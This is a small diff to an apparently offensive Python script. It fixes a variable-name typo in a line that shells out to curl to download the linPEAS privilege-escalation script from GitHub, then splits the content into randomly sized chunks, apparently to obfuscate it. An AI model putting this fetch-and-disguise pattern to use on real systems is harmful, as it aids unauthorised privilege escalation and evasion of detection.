@@ -17,7 +17,7 @@ def alternating_size_chunks(iterable, steps):
         
 
 url = "https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh"
-file_content=os.popen('curl "'+uri+'" 2>/dev/null').read()
+file_content=os.popen('curl "'+url+'" 2>/dev/null').read()
 print("\r")
 content = list(alternating_size_chunks(file_content, (random.randrange(2, 5), random.randrange(2, 5), random.randrange(2, 5))))
 
